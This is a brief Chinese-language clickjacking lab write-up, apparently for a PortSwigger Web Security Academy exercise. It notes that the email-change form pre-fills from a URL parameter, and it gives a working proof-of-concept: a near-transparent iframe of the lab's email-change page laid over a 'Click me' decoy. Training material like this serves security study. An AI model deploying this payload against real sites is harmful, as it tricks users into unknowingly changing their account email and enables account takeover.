修改email界面可以通过url控制输入框的预填充值

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/点击劫持/images/64C7AD97E2DE4D789CDB6C1CEFC3B79Cclipboard.png)



构造poc进行点击劫持：

```javascript
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acea1f8f1fc2b1dc80ed062a00db004e.web-security-academy.net/email?email=123@qq.com"></iframe>
```

